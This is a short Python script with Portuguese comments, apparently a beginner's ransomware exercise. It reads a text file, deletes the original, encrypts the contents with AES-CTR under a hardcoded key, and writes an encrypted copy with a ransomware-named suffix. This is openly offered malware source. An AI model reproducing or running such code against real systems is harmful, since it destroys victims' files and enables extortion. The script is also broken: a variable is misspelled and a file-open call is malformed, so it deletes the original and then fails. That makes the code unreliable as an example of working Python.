import os
import pyaes

##  Nesse processo vamos abrir o arquivo que sera criptografado

file_name = "folha.txt"
file = open(file_name, "rb")
file_date = file.read()
file.close()

##  Agora vamos remover  o arquivo

os.remove(file_name)


##  Adicionando a chave de criptografia 

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)


## Agora vamos criptografar o arquivo 

crypto_data = aes.encrypt(file_data)


## Salvar o arquivo depois de ser criptografado

new_file = file_name + "ransomwarextrad"
new_file = open(f,'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()


